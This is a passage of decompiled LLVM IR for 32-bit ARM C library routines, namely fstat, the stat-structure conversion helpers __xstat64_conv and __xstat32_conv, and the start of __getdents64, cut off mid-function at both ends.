  %v27_165b0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_165b0, i32* %v25_165b0, align 4
  %v28_165b0 = add i32 %v0_165ac, 36
  %v29_165b0 = inttoptr i32 %v28_165b0 to i32*
  %v30_165b0 = load i32, i32* @lr, align 4
  store i32 %v30_165b0, i32* %v29_165b0, align 4
  %v0_165b4 = call i32 @__sigjmp_save()
  ret i32 %v0_165b4

; uselistorder directives
  uselistorder i32 %v0_165ac, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 73, 74, 3, 4, 5, 6, 7, 8, 9, 10, 60, 61, 62, 63, 64, 66, 65, 67, 11, 12, 17, 18, 13, 14, 15, 16, 19, 20, 21, 22, 23, 24, 25, 0, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 68, 69, 70, 2, 71, 72, 75 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_165c0 = load i32, i32* @r1, align 4
  store i32 %v0_165c0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_165d0 = load i32, i32* @r0, align 4
  store i32 %v0_165d0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_165d0, -4095
  br i1 %tmp, label %dec_label_pc_165f8, label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %entry
  %v0_165e0 = call i32 @__aeabi_read_tp()
  %v3_165e4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_165e4 = sext i16 %v3_165e4 to i32
  store i32 %v4_165e4, i32* @r3, align 4
  %v0_165e8 = load i32, i32* @r2, align 4
  %v1_165e8 = sub i32 0, %v0_165e8
  store i32 %v1_165e8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_165f0 = add i32 %v4_165e4, %v0_165e0
  %v4_165f0 = inttoptr i32 %v3_165f0 to i32*
  store i32 %v1_165e8, i32* %v4_165f0, align 4
  br label %dec_label_pc_16608

dec_label_pc_165f8:                               ; preds = %entry
  store i32 %v0_165d0, i32* %r7.global-to-local, align 4
  %v2_165f8 = icmp eq i32 %v0_165d0, 0
  br i1 %v2_165f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_165f8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_165f8, %bb
  call void @__pseudo_cond_branch(i1 %v2_165f8, i32 ptrtoint (i32* @global_var_166e8.912 to i32))
  br label %dec_label_pc_16608

dec_label_pc_16608:                               ; preds = %dec_label_pc_165dc, %.thread
  %v0_16608 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16608

; uselistorder directives
  uselistorder i32 %v0_165d0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16608, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1661c = load i32, i32* @r4, align 4
  store i32 %v3_1661c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_16634 = inttoptr i32 %arg2 to i8*
  %v4_16634 = call i32 @__GI_memset(i8* %v3_16634, i32 0, i32 104)
  %v2_16638 = load i32, i32* %arg1, align 4
  store i32 %v2_16638, i32* %r3.global-to-local, align 4
  %v3_16638 = add i32 %tmp, 4
  %v4_16638 = inttoptr i32 %v3_16638 to i32*
  %v5_16638 = load i32, i32* %v4_16638, align 4
  store i32 %v5_16638, i32* %r4.global-to-local, align 4
  %v0_1663c = load i32, i32* %r5.global-to-local, align 4
  %v1_1663c = inttoptr i32 %v0_1663c to i32*
  store i32 %v2_16638, i32* %v1_1663c, align 4
  %v3_1663c = add i32 %v0_1663c, 4
  %v4_1663c = inttoptr i32 %v3_1663c to i32*
  %v5_1663c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1663c, i32* %v4_1663c, align 4
  %v0_16640 = load i32, i32* %r6.global-to-local, align 4
  %v1_16640 = add i32 %v0_16640, 12
  %v2_16640 = inttoptr i32 %v1_16640 to i32*
  %v3_16640 = load i32, i32* %v2_16640, align 4
  %v1_16644 = load i32, i32* %r5.global-to-local, align 4
  %v2_16644 = add i32 %v1_16644, 12
  %v3_16644 = inttoptr i32 %v2_16644 to i32*
  store i32 %v3_16640, i32* %v3_16644, align 4
  %v0_16648 = load i32, i32* %r6.global-to-local, align 4
  %v1_16648 = add i32 %v0_16648, 96
  store i32 %v1_16648, i32* %r3.global-to-local, align 4
  %v1_1664c = inttoptr i32 %v1_16648 to i32*
  %v2_1664c = load i32, i32* %v1_1664c, align 4
  store i32 %v2_1664c, i32* %r3.global-to-local, align 4
  %v3_1664c = add i32 %v0_16648, 100
  %v4_1664c = inttoptr i32 %v3_1664c to i32*
  %v5_1664c = load i32, i32* %v4_1664c, align 4
  store i32 %v5_1664c, i32* %r4.global-to-local, align 4
  %v1_16650 = add i32 %v0_16648, 56
  %v2_16650 = inttoptr i32 %v1_16650 to i32*
  %v3_16650 = load i32, i32* %v2_16650, align 4
  store i32 %v3_16650, i32* %r2.global-to-local, align 4
  %v1_16654 = load i32, i32* %r5.global-to-local, align 4
  %v2_16654 = add i32 %v1_16654, 96
  %v3_16654 = inttoptr i32 %v2_16654 to i32*
  store i32 %v2_1664c, i32* %v3_16654, align 4
  %v0_16658 = load i32, i32* %r4.global-to-local, align 4
  %v1_16658 = load i32, i32* %r5.global-to-local, align 4
  %v2_16658 = add i32 %v1_16658, 100
  %v3_16658 = inttoptr i32 %v2_16658 to i32*
  store i32 %v0_16658, i32* %v3_16658, align 4
  %v0_1665c = load i32, i32* %r6.global-to-local, align 4
  %v1_1665c = add i32 %v0_1665c, 24
  store i32 %v1_1665c, i32* %ip.global-to-local, align 4
  %v1_16660 = inttoptr i32 %v1_1665c to i32*
  %v2_16660 = load i32, i32* %v1_16660, align 4
  store i32 %v2_16660, i32* %ip.global-to-local, align 4
  %v3_16660 = add i32 %v0_1665c, 28
  %v4_16660 = inttoptr i32 %v3_16660 to i32*
  %v5_16660 = load i32, i32* %v4_16660, align 4
  store i32 %v5_16660, i32* %lr.global-to-local, align 4
  %v0_16664 = load i32, i32* %r2.global-to-local, align 4
  %v1_16664 = load i32, i32* %r5.global-to-local, align 4
  %v2_16664 = add i32 %v1_16664, 56
  %v3_16664 = inttoptr i32 %v2_16664 to i32*
  store i32 %v0_16664, i32* %v3_16664, align 4
  %v0_16668 = load i32, i32* %r6.global-to-local, align 4
  %v1_16668 = add i32 %v0_16668, 72
  store i32 %v1_16668, i32* %r3.global-to-local, align 4
  %v1_1666c = add i32 %v0_16668, 32
  store i32 %v1_1666c, i32* %r7.global-to-local, align 4
  %v1_16670 = inttoptr i32 %v1_1666c to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  store i32 %v2_16670, i32* %r7.global-to-local, align 4
  %v3_16670 = add i32 %v0_16668, 36
  %v4_16670 = inttoptr i32 %v3_16670 to i32*
  %v5_16670 = load i32, i32* %v4_16670, align 4
  store i32 %v5_16670, i32* %r8.global-to-local, align 4
  %v1_16674 = inttoptr i32 %v1_16668 to i32*
  %v2_16674 = load i32, i32* %v1_16674, align 4
  %v3_16674 = add i32 %v0_16668, 76
  %v4_16674 = inttoptr i32 %v3_16674 to i32*
  %v5_16674 = load i32, i32* %v4_16674, align 4
  store i32 %v5_16674, i32* %r1.global-to-local, align 4
  %v0_16678 = load i32, i32* %r5.global-to-local, align 4
  %v1_16678 = add i32 %v0_16678, 72
  %v1_1667c = inttoptr i32 %v1_16678 to i32*
  store i32 %v2_16674, i32* %v1_1667c, align 4
  %v3_1667c = add i32 %v0_16678, 76
  %v4_1667c = inttoptr i32 %v3_1667c to i32*
  %v5_1667c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1667c, i32* %v4_1667c, align 4
  %v0_16680 = load i32, i32* %r7.global-to-local, align 4
  %v1_16680 = load i32, i32* %r5.global-to-local, align 4
  %v2_16680 = add i32 %v1_16680, 32
  %v3_16680 = inttoptr i32 %v2_16680 to i32*
  store i32 %v0_16680, i32* %v3_16680, align 4
  %v0_16684 = load i32, i32* %r8.global-to-local, align 4
  %v1_16684 = load i32, i32* %r5.global-to-local, align 4
  %v2_16684 = add i32 %v1_16684, 36
  %v3_16684 = inttoptr i32 %v2_16684 to i32*
  store i32 %v0_16684, i32* %v3_16684, align 4
  %v0_16688 = load i32, i32* %r6.global-to-local, align 4
  %v1_16688 = add i32 %v0_16688, 80
  store i32 %v1_16688, i32* %r3.global-to-local, align 4
  %v1_1668c = add i32 %v0_16688, 48
  store i32 %v1_1668c, i32* %r7.global-to-local, align 4
  %v1_16690 = inttoptr i32 %v1_1668c to i32*
  %v2_16690 = load i32, i32* %v1_16690, align 4
  store i32 %v2_16690, i32* %r7.global-to-local, align 4
  %v3_16690 = add i32 %v0_16688, 52
  %v4_16690 = inttoptr i32 %v3_16690 to i32*
  %v5_16690 = load i32, i32* %v4_16690, align 4
  store i32 %v5_16690, i32* %r8.global-to-local, align 4
  %v1_16694 = inttoptr i32 %v1_16688 to i32*
  %v2_16694 = load i32, i32* %v1_16694, align 4
  %v3_16694 = add i32 %v0_16688, 84
  %v4_16694 = inttoptr i32 %v3_16694 to i32*
  %v5_16694 = load i32, i32* %v4_16694, align 4
  store i32 %v5_16694, i32* %r1.global-to-local, align 4
  %v1_16698 = add i32 %v0_16688, 16
  %v2_16698 = inttoptr i32 %v1_16698 to i32*
  %v3_16698 = load i32, i32* %v2_16698, align 4
  store i32 %v3_16698, i32* %r2.global-to-local, align 4
  %v0_1669c = load i32, i32* %r5.global-to-local, align 4
  %v1_1669c = add i32 %v0_1669c, 80
  %v1_166a0 = inttoptr i32 %v1_1669c to i32*
  store i32 %v2_16694, i32* %v1_166a0, align 4
  %v3_166a0 = add i32 %v0_1669c, 84
  %v4_166a0 = inttoptr i32 %v3_166a0 to i32*
  %v5_166a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_166a0, i32* %v4_166a0, align 4
  %v0_166a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_166a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166a4 = add i32 %v1_166a4, 48
  %v3_166a4 = inttoptr i32 %v2_166a4 to i32*
  store i32 %v0_166a4, i32* %v3_166a4, align 4
  %v0_166a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_166a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_166a8 = add i32 %v1_166a8, 52
  %v3_166a8 = inttoptr i32 %v2_166a8 to i32*
  store i32 %v0_166a8, i32* %v3_166a8, align 4
  %v0_166ac = load i32, i32* %r2.global-to-local, align 4
  %v1_166ac = load i32, i32* %r5.global-to-local, align 4
  %v2_166ac = add i32 %v1_166ac, 16
  %v3_166ac = inttoptr i32 %v2_166ac to i32*
  store i32 %v0_166ac, i32* %v3_166ac, align 4
  %v0_166b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_166b0 = add i32 %v0_166b0, 88
  store i32 %v1_166b0, i32* %r3.global-to-local, align 4
  %v1_166b4 = add i32 %v0_166b0, 20
  %v2_166b4 = inttoptr i32 %v1_166b4 to i32*
  %v3_166b4 = load i32, i32* %v2_166b4, align 4
  store i32 %v3_166b4, i32* %r2.global-to-local, align 4
  %v1_166b8 = inttoptr i32 %v1_166b0 to i32*
  %v2_166b8 = load i32, i32* %v1_166b8, align 4
  %v3_166b8 = add i32 %v0_166b0, 92
  %v4_166b8 = inttoptr i32 %v3_166b8 to i32*
  %v5_166b8 = load i32, i32* %v4_166b8, align 4
  store i32 %v5_166b8, i32* %r1.global-to-local, align 4
  %v1_166bc = add i32 %v0_166b0, 64
  store i32 %v1_166bc, i32* %r6.global-to-local, align 4
  %v1_166c0 = inttoptr i32 %v1_166bc to i32*
  %v2_166c0 = load i32, i32* %v1_166c0, align 4
  store i32 %v2_166c0, i32* %r6.global-to-local, align 4
  %v3_166c0 = add i32 %v0_166b0, 68
  %v4_166c0 = inttoptr i32 %v3_166c0 to i32*
  %v5_166c0 = load i32, i32* %v4_166c0, align 4
  store i32 %v5_166c0, i32* %r7.global-to-local, align 4
  %v0_166c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166c4 = add i32 %v0_166c4, 88
  store i32 %v1_166c4, i32* %r3.global-to-local, align 4
  %v2_166c8 = add i32 %v0_166c4, 20
  %v3_166c8 = inttoptr i32 %v2_166c8 to i32*
  store i32 %v3_166b4, i32* %v3_166c8, align 4
  %v0_166cc = load i32, i32* %ip.global-to-local, align 4
  %v1_166cc = load i32, i32* %r5.global-to-local, align 4
  %v2_166cc = add i32 %v1_166cc, 24
  %v3_166cc = inttoptr i32 %v2_166cc to i32*
  store i32 %v0_166cc, i32* %v3_166cc, align 4
  %v0_166d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_166d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_166d0 = add i32 %v1_166d0, 28
  %v3_166d0 = inttoptr i32 %v2_166d0 to i32*
  store i32 %v0_166d0, i32* %v3_166d0, align 4
  %v0_166d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_166d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166d4 = add i32 %v1_166d4, 64
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 %v0_166d4, i32* %v3_166d4, align 4
  %v0_166d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_166d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_166d8 = add i32 %v1_166d8, 68
  %v3_166d8 = inttoptr i32 %v2_166d8 to i32*
  store i32 %v0_166d8, i32* %v3_166d8, align 4
  %v0_166dc = load i32, i32* %r3.global-to-local, align 4
  %v1_166dc = inttoptr i32 %v0_166dc to i32*
  store i32 %v2_166b8, i32* %v1_166dc, align 4
  %v3_166dc = add i32 %v0_166dc, 4
  %v4_166dc = inttoptr i32 %v3_166dc to i32*
  %v5_166dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_166dc, i32* %v4_166dc, align 4
  %v2_166e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166e0, i32* %r4.global-to-local, align 4
  ret i32 %v2_166b8

; uselistorder directives
  uselistorder i32 %v0_166b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16688, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 0, 4, 1, 2, 6, 3, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_166e8 = load i32, i32* @r4, align 4
  store i32 %v3_166e8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_16700 = inttoptr i32 %arg2 to i8*
  %v4_16700 = call i32 @__GI_memset(i8* %v3_16700, i32 0, i32 88)
  %v2_16704 = load i32, i32* %arg1, align 4
  %v3_16704 = add i32 %tmp, 4
  %v4_16704 = inttoptr i32 %v3_16704 to i32*
  %v5_16704 = load i32, i32* %v4_16704, align 4
  store i32 %v5_16704, i32* %r4.global-to-local, align 4
  %v0_16708 = load i32, i32* %r6.global-to-local, align 4
  %v1_16708 = inttoptr i32 %v0_16708 to i32*
  store i32 %v2_16704, i32* %v1_16708, align 4
  %v3_16708 = add i32 %v0_16708, 4
  %v4_16708 = inttoptr i32 %v3_16708 to i32*
  %v5_16708 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16708, i32* %v4_16708, align 4
  %v0_1670c = load i32, i32* %r5.global-to-local, align 4
  %v1_1670c = add i32 %v0_1670c, 32
  %v1_16710 = inttoptr i32 %v1_1670c to i32*
  %v2_16710 = load i32, i32* %v1_16710, align 4
  %v3_16710 = add i32 %v0_1670c, 36
  %v4_16710 = inttoptr i32 %v3_16710 to i32*
  %v5_16710 = load i32, i32* %v4_16710, align 4
  store i32 %v5_16710, i32* %r4.global-to-local, align 4
  %v1_16714 = add i32 %v0_1670c, 96
  %v2_16714 = inttoptr i32 %v1_16714 to i32*
  %v3_16714 = load i32, i32* %v2_16714, align 4
  store i32 %v3_16714, i32* %r2.global-to-local, align 4
  %v1_16718 = load i32, i32* %r6.global-to-local, align 4
  %v2_16718 = add i32 %v1_16718, 32
  %v3_16718 = inttoptr i32 %v2_16718 to i32*
  store i32 %v2_16710, i32* %v3_16718, align 4
  %v0_1671c = load i32, i32* %r4.global-to-local, align 4
  %v1_1671c = load i32, i32* %r6.global-to-local, align 4
  %v2_1671c = add i32 %v1_1671c, 36
  %v3_1671c = inttoptr i32 %v2_1671c to i32*
  store i32 %v0_1671c, i32* %v3_1671c, align 4
  %v0_16720 = load i32, i32* %r2.global-to-local, align 4
  %v1_16720 = load i32, i32* %r6.global-to-local, align 4
  %v2_16720 = add i32 %v1_16720, 12
  %v3_16720 = inttoptr i32 %v2_16720 to i32*
  store i32 %v0_16720, i32* %v3_16720, align 4
  %v0_16724 = load i32, i32* %r5.global-to-local, align 4
  %v1_16724 = add i32 %v0_16724, 48
  %v2_16724 = inttoptr i32 %v1_16724 to i32*
  %v3_16724 = load i32, i32* %v2_16724, align 4
  %v1_16728 = add i32 %v0_16724, 24
  store i32 %v1_16728, i32* %ip.global-to-local, align 4
  %v1_1672c = inttoptr i32 %v1_16728 to i32*
  %v2_1672c = load i32, i32* %v1_1672c, align 4
  store i32 %v2_1672c, i32* %ip.global-to-local, align 4
  %v3_1672c = add i32 %v0_16724, 28
  %v4_1672c = inttoptr i32 %v3_1672c to i32*
  %v5_1672c = load i32, i32* %v4_1672c, align 4
  store i32 %v5_1672c, i32* %lr.global-to-local, align 4
  %v1_16730 = load i32, i32* %r6.global-to-local, align 4
  %v2_16730 = add i32 %v1_16730, 44
  %v3_16730 = inttoptr i32 %v2_16730 to i32*
  store i32 %v3_16724, i32* %v3_16730, align 4
  %v0_16734 = load i32, i32* %r5.global-to-local, align 4
  %v1_16734 = add i32 %v0_16734, 64
  %v2_16734 = inttoptr i32 %v1_16734 to i32*
  %v3_16734 = load i32, i32* %v2_16734, align 4
  %v1_16738 = add i32 %v0_16734, 56
  %v2_16738 = inttoptr i32 %v1_16738 to i32*
  %v3_16738 = load i32, i32* %v2_16738, align 4
  store i32 %v3_16738, i32* %r2.global-to-local, align 4
  %v1_1673c = load i32, i32* %r6.global-to-local, align 4
  %v2_1673c = add i32 %v1_1673c, 52
  %v3_1673c = inttoptr i32 %v2_1673c to i32*
  store i32 %v3_16734, i32* %v3_1673c, align 4
  %v0_16740 = load i32, i32* %r2.global-to-local, align 4
  %v1_16740 = load i32, i32* %r6.global-to-local, align 4
  %v2_16740 = add i32 %v1_16740, 48
  %v3_16740 = inttoptr i32 %v2_16740 to i32*
  store i32 %v0_16740, i32* %v3_16740, align 4
  %v0_16744 = load i32, i32* %r5.global-to-local, align 4
  %v1_16744 = add i32 %v0_16744, 72
  %v1_16748 = inttoptr i32 %v1_16744 to i32*
  %v2_16748 = load i32, i32* %v1_16748, align 4
  %v3_16748 = add i32 %v0_16744, 76
  %v4_16748 = inttoptr i32 %v3_16748 to i32*
  %v5_16748 = load i32, i32* %v4_16748, align 4
  store i32 %v5_16748, i32* %r1.global-to-local, align 4
  %v0_1674c = load i32, i32* %r6.global-to-local, align 4
  %v1_1674c = add i32 %v0_1674c, 56
  %v1_16750 = inttoptr i32 %v1_1674c to i32*
  store i32 %v2_16748, i32* %v1_16750, align 4
  %v3_16750 = add i32 %v0_1674c, 60
  %v4_16750 = inttoptr i32 %v3_16750 to i32*
  %v5_16750 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16750, i32* %v4_16750, align 4
  %v0_16754 = load i32, i32* %r5.global-to-local, align 4
  %v1_16754 = add i32 %v0_16754, 80
  %v1_16758 = inttoptr i32 %v1_16754 to i32*
  %v2_16758 = load i32, i32* %v1_16758, align 4
  %v3_16758 = add i32 %v0_16754, 84
  %v4_16758 = inttoptr i32 %v3_16758 to i32*
  %v5_16758 = load i32, i32* %v4_16758, align 4
  store i32 %v5_16758, i32* %r1.global-to-local, align 4
  %v0_1675c = load i32, i32* %r6.global-to-local, align 4
  %v1_1675c = add i32 %v0_1675c, 64
  %v1_16760 = inttoptr i32 %v1_1675c to i32*
  store i32 %v2_16758, i32* %v1_16760, align 4
  %v3_16760 = add i32 %v0_1675c, 68
  %v4_16760 = inttoptr i32 %v3_16760 to i32*
  %v5_16760 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16760, i32* %v4_16760, align 4
  %v0_16764 = load i32, i32* %r5.global-to-local, align 4
  %v1_16764 = add i32 %v0_16764, 16
  %v2_16764 = inttoptr i32 %v1_16764 to i32*
  %v3_16764 = load i32, i32* %v2_16764, align 4
  %v1_16768 = load i32, i32* %r6.global-to-local, align 4
  %v2_16768 = add i32 %v1_16768, 16
  %v3_16768 = inttoptr i32 %v2_16768 to i32*
  store i32 %v3_16764, i32* %v3_16768, align 4
  %v0_1676c = load i32, i32* %r5.global-to-local, align 4
  %v1_1676c = add i32 %v0_1676c, 88
  %v1_16770 = add i32 %v0_1676c, 20
  %v2_16770 = inttoptr i32 %v1_16770 to i32*
  %v3_16770 = load i32, i32* %v2_16770, align 4
  store i32 %v3_16770, i32* %r2.global-to-local, align 4
  %v1_16774 = inttoptr i32 %v1_1676c to i32*
  %v2_16774 = load i32, i32* %v1_16774, align 4
  %v3_16774 = add i32 %v0_1676c, 92
  %v4_16774 = inttoptr i32 %v3_16774 to i32*
  %v5_16774 = load i32, i32* %v4_16774, align 4
  store i32 %v5_16774, i32* %r1.global-to-local, align 4
  %v0_16778 = load i32, i32* %r6.global-to-local, align 4
  %v1_16778 = add i32 %v0_16778, 72
  %v1_1677c = inttoptr i32 %v1_16778 to i32*
  store i32 %v2_16774, i32* %v1_1677c, align 4
  %v3_1677c = add i32 %v0_16778, 76
  %v4_1677c = inttoptr i32 %v3_1677c to i32*
  %v5_1677c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1677c, i32* %v4_1677c, align 4
  %v0_16780 = load i32, i32* %r2.global-to-local, align 4
  %v1_16780 = load i32, i32* %r6.global-to-local, align 4
  %v2_16780 = add i32 %v1_16780, 20
  %v3_16780 = inttoptr i32 %v2_16780 to i32*
  store i32 %v0_16780, i32* %v3_16780, align 4
  %v0_16784 = load i32, i32* %ip.global-to-local, align 4
  %v1_16784 = load i32, i32* %r6.global-to-local, align 4
  %v2_16784 = add i32 %v1_16784, 24
  %v3_16784 = inttoptr i32 %v2_16784 to i32*
  store i32 %v0_16784, i32* %v3_16784, align 4
  %v0_16788 = load i32, i32* %lr.global-to-local, align 4
  %v1_16788 = load i32, i32* %r6.global-to-local, align 4
  %v2_16788 = add i32 %v1_16788, 28
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  store i32 %v0_16788, i32* %v3_16788, align 4
  %v2_1678c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1678c, i32* %r4.global-to-local, align 4
  ret i32 %v2_16774

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 5, 0, 1, 2, 3, 4, 8, 7, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_16798 = load i32, i32* @r5, align 4
  %v12_16798 = load i32, i32* @r7, align 4
  %v1_1679c = add i32 %arg3, 14
  %v2_167a4 = ptrtoint i32* %stack_var_-72 to i32
  %v1_167a8 = and i32 %v1_1679c, -8
  %v2_167ac = sub i32 %v2_167a4, %v1_167a8
  %v1_167b0 = add i32 %v2_167ac, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_167f4, label %dec_label_pc_167d8

dec_label_pc_167d8:                               ; preds = %entry
  %v1_167dc = sub i32 0, %arg1
  %v3_167e0 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_167e0 = sext i16 %v3_167e0 to i32
  %v0_167e4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_167ec = add i32 %v4_167e0, %v0_167e4
  %v4_167ec = inttoptr i32 %v3_167ec to i32*
  store i32 %v1_167dc, i32* %v4_167ec, align 4
  br label %dec_label_pc_168c4

dec_label_pc_167f4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_168c4, label %dec_label_pc_167fc

dec_label_pc_167fc:                               ; preds = %dec_label_pc_167f4
  %v2_167fc = add i32 %v1_167b0, %arg1
  store i32 %v2_167fc, i32* %r1.global-to-local, align 4
  %v2_16800 = add i32 %tmp, %arg3
  store i32 %v1_167b0, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_168ac

dec_label_pc_1681c:                               ; preds = %dec_label_pc_168ac
  %v1_1681c = add i32 %v0_1687c, 16
  %v2_1681c = inttoptr i32 %v1_1681c to i16*
  %v3_1681c = load i16, i16* %v2_1681c, align 2
  %v4_1681c = zext i16 %v3_1681c to i32
  %v1_16820 = add nsw i32 %v4_1681c, -19
  store i32 %v1_16820, i32* @r2, align 4
  %v1_16824 = add nuw nsw i32 %v4_1681c, 7
  %v1_16828 = and i32 %v1_16824, 131064
  store i32 %v1_16828, i32* @ip, align 4
  %v2_16830 = add i32 %v1_16828, %v0_16884
  store i32 %v2_16830, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_16830, %v2_16800
  br i1 %tmp24, label %dec_label_pc_1683c, label %dec_label_pc_16878

dec_label_pc_1683c:                               ; preds = %dec_label_pc_1681c
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_16844 = load i32, i32* %r8.global-to-local, align 4
  %v0_16848 = load i32, i32* %sb.global-to-local, align 4
  %v1_1684c = load i32, i32* @sp, align 4
  %v2_1684c = inttoptr i32 %v1_1684c to i32*
  store i32 0, i32* %v2_1684c, align 4
  %v4_16850 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_16844, i32 %v0_16848)
  %v0_16854 = load i32, i32* @r5, align 4
  %v1_16854 = load i32, i32* %sl.global-to-local, align 4
  %v9_16854 = icmp eq i32 %v0_16854, %v1_16854
  br i1 %v9_16854, label %dec_label_pc_1685c, label %dec_label_pc_168c0

dec_label_pc_1685c:                               ; preds = %dec_label_pc_1683c
  %v0_16860 = call i32 @__aeabi_read_tp()
  %v3_16864 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_16864 = sext i16 %v3_16864 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16870 = add i32 %v4_16864, %v0_16860
  %v4_16870 = inttoptr i32 %v3_16870 to i32*
  store i32 22, i32* %v4_16870, align 4
  br label %dec_label_pc_168c4

dec_label_pc_16878:                               ; preds = %dec_label_pc_1681c
  %v1_16878 = inttoptr i32 %v0_1687c to i32*
  %v2_16878 = load i32, i32* %v1_16878, align 4
  %v3_16878 = add i32 %v0_1687c, 4
  %v4_16878 = inttoptr i32 %v3_16878 to i32*
  %v5_16878 = load i32, i32* %v4_16878, align 4
  store i32 %v5_16878, i32* @r4, align 4
  %v1_1687c = add i32 %v0_1687c, 8
